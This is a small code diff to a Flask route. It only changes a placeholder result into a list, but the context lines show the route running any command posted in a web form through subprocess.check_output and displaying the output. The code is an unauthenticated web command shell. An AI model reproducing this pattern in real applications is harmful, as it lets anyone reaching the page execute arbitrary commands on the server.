@@ -46,11 +46,11 @@ html = """
 def hello_world():
 
     if request.method == "GET":
-        return render_template_string(html, command_result="Command result here...", cmd="")
+        return render_template_string(html, command_result=["Command result here..."], cmd="")
     if request.method == "POST":
         cmd = request.form.get('cmd')
         cmd = cmd.split(" ")
         if cmd is not None:
             result = subprocess.check_output(cmd).decode('utf-8').split('\n')
             return render_template_string(html, command_result=result, cmd=" ".join(cmd))
-        return render_template_string(html, command_result="Command result here...", cmd="")
+        return render_template_string(html, command_result=["Command result here..."], cmd="")
